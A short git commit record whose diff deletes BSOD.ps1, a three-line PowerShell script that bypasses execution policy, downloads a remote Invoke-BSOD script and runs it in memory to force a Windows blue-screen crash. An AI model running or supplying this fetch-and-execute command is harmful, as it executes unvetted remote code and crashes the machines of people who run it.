7ea3079b9f9ab02586c4ffa5d467c7670c020b0e
BryceHeitzmann <109158364+Dialga156b@users.noreply.github.com>
2025-05-26 16:19:32 -0400

    Delete BSOD.ps1

--- BSOD.ps1
+++
@@ -1,3 +0,0 @@
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'))
-Invoke-BSOD
